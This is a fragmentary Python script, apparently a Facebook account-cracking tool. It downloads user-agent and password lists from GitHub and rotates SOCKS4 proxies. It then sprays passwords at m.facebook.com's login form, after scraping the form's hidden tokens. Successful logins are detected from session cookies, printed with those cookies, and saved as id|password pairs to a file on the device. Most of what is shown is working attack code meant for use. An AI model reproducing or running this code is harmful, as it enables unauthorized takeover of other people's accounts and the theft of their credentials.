...
mdl_url = 'https://gist.githubusercontent.com/REFAT-156/ce32dac4fd13dc22eb94c9ef5003300f/raw/8b89908acc56beabce9eb329e7873e8e58702515/'
base_url = 'https://raw.githubusercontent.com/TO-XD/TOP-SEC/main/'
vrs_url = 'https://raw.githubusercontent.com/REFAT-156/REFAT-XD/main/'
vrs_curl = vrs_url+'ttv.txt'
mdl_curl = mdl_url+'17k+'
m1ua_url = base_url+'one.txt'
m2ua_url = base_url+'two.txt'
m3ua_url = base_url+'three.txt'
m4ua_url = base_url+'four.txt'
m5ua_url = base_url+'five.txt'
def get_text_lines(url):
    try:
        ...
        exit(f"{style} Your Network Is Unreachable ! ")
    return buffer.getvalue().decode('utf-8').splitlines()
vr = '\n'.join(get_text_lines(vrs_curl))
mdl = get_text_lines(mdl_curl)
m1ua = get_text_lines(m1ua_url)
m2ua = get_text_lines(m2ua_url)
m3ua = get_text_lines(m3ua_url)
m4ua = get_text_lines(m4ua_url)
m5ua = get_text_lines(m5ua_url)
###----------[ PEH ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'%s[{M}×{P}]{M} Your Expired Apps                 {P}'%(P))
        for i in range(len(game)):
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             break
                ...
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis);cek_apk(session,coki)
 ...
 for pw in pwv:
  try:
   ...
   if "checkpoint" in po.cookies.get_dict().keys():
    ...
    print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
    if 'y' in cokix:
     print(f'\r{gen}{H}'+kuki);cek_apk(session,coki)
    open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(idf+'|'+pw+'\n')
    break
   else:
    continue
...
def f1(idf,pwv):
  ...
  for pw in pwv:
    try:
      nip=random.choice(proxsi)
      proxs= {'http': 'socks4://'+nip}
      ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": uau,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
      p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=187925050049656&kid_directed_site=0&app_id=187925050049656&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D187925050049656%26redirect_uri%3Dhttps%253A%252F%252Fwpmethods.com%252Foauth-redirect-uri-proxy%252F%253FloginSocial%253Dfacebook%26state%3D14be9192a4e0ae9796ce487ad4b0d008%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D187dccad-417d-411a-94d1-0ff34cfd6b87%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwpmethods.com%2Foauth-redirect-uri-proxy%2F%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D14be9192a4e0ae9796ce487ad4b0d008%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr")
      dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade={
      ...
      "content-type": "application/x-www-form-urlencoded",
      "user-agent": uau, #'Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.15 Mobile Safari/537.36',
      "accept": "*/*",
      "x-requested-with": "com.microsoft.bing",
      "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
      "sec-ch-ua-platform": '"Android"',
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki);cek_apk(session,coki)
    ok+=1 
